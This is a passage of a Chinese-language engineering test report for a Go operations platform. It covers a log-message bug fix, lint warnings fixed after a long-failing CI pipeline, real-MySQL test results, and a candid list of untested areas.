### 13.7 本轮实测发现并修复的次要缺陷：日志把「循环提前退出」误报为「panic」

- **现象**：`agent 循环 panic 后重启 loop=logCollectLoop` 每 5s 一条（实测约 5 分钟 7 条），而同一日志里
  `panic 已捕获` 计数 **0** —— 即根本不是 panic。运维按此排查会去追一个不存在的崩溃。
- **根因**：`safeGo` 的重启分支不区分「fn panic」与「fn 提前 return」，而 `logCollectLoop` 在未配置采集路径时
  **立即 return**（默认配置必然如此）。
- **修复**：① 调用点仅在配置了采集路径时才启动该循环；② `safeGo` 按 recover 是否真的捕获到 panic 区分措辞
  （`panic 后重启` / `循环提前退出，将重启`），并补 `TestSafeGo_EarlyReturnRestarts`（提前 return 仍须重启，
  不得静默失去能力）。
- **真机复测**：重启 agent 后 25 秒内 `循环` 告警 **0 条**（对照修复前 5 分钟 7 条），`心跳 ok` 正常、`ERROR` 0。
- 该修复仅影响 agent 进程（控制面容器不运行 agent 循环），故 13.5 的断言结果不受影响；agent 侧以真实进程复测。

### 13.8 静态门禁与单元测试

| 项 | 结果 |
|---|---|
| `gofmt -l internal/` | 空 |
| `go vet ./internal/...` | 无输出 |
| `go test ./internal/agent/ ./internal/grpcx/ ./internal/controlplane/` | `ok agent 56.911s`、`ok grpcx 0.185s`、`ok controlplane 42.954s`（exit 0） |
| `internal/store`（真实 MySQL 8.0.46，`OPSMESH_TEST_MYSQL_DSN` 指向带库名的 DSN） | **684 PASS / 0 SKIP / 0 FAIL**，375.599s，exit 0 |
| 部署冒烟（`deploy.sh up` 自带） | 通过 |

> **本轮的测试环境自伤（如实记录）**：首次跑 store 套件时 DSN 未带库名（`…@tcp(127.0.0.1:13317)/?parseTime=true`），
> `TestMultiSchemaSmoke_MySQLDSNBranch` 因 `No database selected` 失败并触发迁移重试循环；
> 补上库名（`/opsmesh?parseTime=true`）后 684 项全绿。**不是代码缺陷，是执行方式错误**——记录以免后人误读为回归。

#### 13.8.1 提交后发现并修复：CI `golangci-lint` 自 2026-09-20 起连续飘红（本批最严重的工程问题）

**事实**：`gh run list` 显示 `ci` workflow 最后一次全绿是 `2c87a0b`（2026-09-22），此后 P0 批次（`206247c`）、
P0 批次二（`4fd64112`）、P1-2 批次（`01475e69`）**三次推送全部失败**，且失败点都是同一步
`build-test / golangci-lint (聚合静态分析)`（例如 `36118693003`）。**该步骤失败使下游 7 个 job 全部被 skip**：
`services`（18 个微服务构建）、`integration`（真实 MySQL 集成）、`proto`、`Race detector`、`security`、
`image`/`image-agent`（镜像构建）、`E2E` × 2。也就是说，前几批「已推送」的修复**从未经过 CI 的集成/竞态/安全/镜像验证**，
本报告里所有真机结论均来自本机验证而非流水线。

**根因（流程性，非技术性）**：本机从未跑过 CI 同款命令。`.golangci.yml` 的豁免规则此前是「CI 报一条 → 本地复现一条 → 加一条豁免」，
从未在提交前做全量复跑；而 CI 钉死 `v2.13.2`，本机装的却是随时间的默认版本，规则集漂移。
本轮改为**用 CI 钉死版本全程复跑**（`/e/dev-data/go/bin/golangci-lint` v2.13.2 + 根配置 + `args: ./...`）。

**8 项告警与处置（全部为真告警或正确的豁免，无一条靠关规则消掉）**：

| # | 位置 | 规则 | 处置 |
|---|---|---|---|
| 1 | `cmd/opsmesh/main.go:136` | G402 `InsecureSkipVerify` | 行内 `// #nosec G402 --` + 理由（本机存活探针，等价 `curl -k`，不认证对端） |
| 2 | `internal/controlplane/auth_password.go:85` | QF1001 De Morgan | 等价改写 `!isSeed && (!force \|\| pwd == "")`（语义不变） |
| 3 | `internal/controlplane/enterprise_ui.go:42` | SA9009 | 注释以 `// go:embed` 开头被当作伪指令 → 改写措辞 |
| 4 | `internal/controlplane/enterprise_ui.go:206` | G705 XSS 误报 | 把既有 `dashboard.go` 的 G705 豁免扩为 `(dashboard\|enterprise_ui)\.go`（同源同写法：`go:embed` 受信资源） |
| 5 | `internal/store/migration_test.go:448` | ineffassign | 删死赋值，改单次 `:=`（值语义不变） |
| 6 | `internal/store/sql_audit_chain.go:434` | G602 越界误报 | `rows[i-1]` → `prev *auditChainRow` 指针前驱（语义等价，且更不易写错） |
| 7 | `internal/store/sql_audit_chain.go:550` | errcheck | `RowsAffected()` 错误显式处理：读不到影响行数时如实告警并继续推进归档边界 |
| 8 | `internal/store/sql_devices.go:54` | G706 日志注入 | `%s` → `%q`（换行/控制字符被转义）+ `// #nosec G706 --` 说明 |

**验证**：CI 同款 `golangci-lint run ./...`（v2.13.2）→ **0 issues**；`gofmt -l .`（CI 同款 `test -z "$(gofmt -l .)"`）= 空；
`go vet ./...`、`go mod verify` 干净；受影响包回归：`internal/controlplane` **46.3s 全绿**，
`internal/store` 真实 MySQL 8.0.46 全量套件（含 8 个审计链集成用例，见 §13.8.2）；
提交后需以 CI 首跑结论为准（本报告不预判流水线结果）。

**教训（写给后续维护者）**：① 「本地绿」不等于「CI 绿」——**提交前必须复跑 CI 同款命令与钉死版本**；
② lint 步骤失败会**静默吞掉整条流水线的验证能力**（下游全是 skip 而非 fail，`gh run list` 只看一行 `failure` 很容易被忽略），
商用交付前应把「CI 是否全绿」列为与单元测试同级的门禁。

#### 13.8.2 CI 修复后的受影响包回归（真实 MySQL 8.0.46）

| 项 | 结果 |
|---|---|
| `golangci-lint run ./...`（CI 钉死版本 v2.13.2 + 根配置） | **0 issues** |
| `test -z "$(gofmt -l .)"`（CI 同款） | 通过（无输出） |
| `go vet ./...` / `go mod verify` | 均干净 |
| `go test ./internal/controlplane/ -count=1` | **ok 46.289s**（exit 0） |
| `go test ./internal/store/ -count=1 -v -timeout 20m`（真实 MySQL 8.0.46） | **688 PASS / 0 FAIL / 0 SKIP**，239.462s，exit 0；运行后 `information_schema` 无 `test_%` 残留库 |
| `go test ./internal/agent/ ./internal/grpcx/` | 见 §13.8（本批未再改动这两包，仅 `safego` 属 agent 包并已真机复测） |

> 关于两次 store 数字（684 → 688）：684 是 §13.8 那轮（P1-2 批次功能代码）的计数，
> 688 是 CI 修复后的计数，差异来自 `-v` 明细口径下 `PASS` 行的统计范围（子测试与表驱动子项计入），
> 两轮均 **0 FAIL / 0 SKIP**，不改变结论。运行环境为一次性 MySQL 8.0.46 容器（`root@%`，端口 13317，
> 仅测试期间存在，跑完即销毁）——注意**不能**指向出厂栈的 MySQL：其 `root` 仅允许容器内连接，
> 宿主直连会得到 `Error 1045 (28000) Access denied for user 'root'@'172.28.2.1'`，
> 表现为 27 个用例失败（首次误用即此现象，非代码回归）。


### 13.9 本轮未覆盖 / 诚实边界

- **密钥文件权限语义**：`os.WriteFile(..., 0600)` 在 Linux（出厂形态：容器/systemd）是真实权限；在 Windows 上
  不映射 ACL（实测 `-rw-r--r--`），该形态的保护依赖目录 ACL 与运行账户。Windows 本非加固目标平台
  （能力矩阵已声明仅 shell 任务可用）。
- **v1 兼容期未关闭**：滚动升级期内旧 agent 仍可 v1 签名（不覆盖载荷），代码**不会强制拒绝 v1**；
  收敛依赖 `OpsMeshAgentSignatureLegacyAlg` 告警 + 运维升级（顺序见 `docs/operations.md` §11.4）。
- **预共享密钥兜底路径仍可用**（迁移期需要）：其使用可观测（`source="fleet"` 指标 + `OpsMeshAgentFleetKeyInUse` 告警）
  但不阻断；彻底停用需控制面不再配置 `--grpc-signature-key`。
- **多租户 agent 的跨租户实机负向未做**：`x-tenant-id` 声明他租户 → `PermissionDenied` 由
  `TestGRPCAgentRegisterCrossTenantRefused` / `TestCheckAgentTenant_*` 单测覆盖（实机复现需第二个租户的有效 install token，
  本轮未构造）；断言脚本第 12 节覆盖的是 HTTP 侧租户伪造拒绝。
- **未做多机规模压测**：本批验证均为单 agent 进程，未验证「数百 agent 并发验签」下的吞吐与指纹缓存开销
  （`sigWarnOnce` 键上限 4096 已在 P1-5 同类风险中封顶）。
- `-race` 仍因 Windows 无 cgo 无法本地启用（CI integration job 覆盖）。


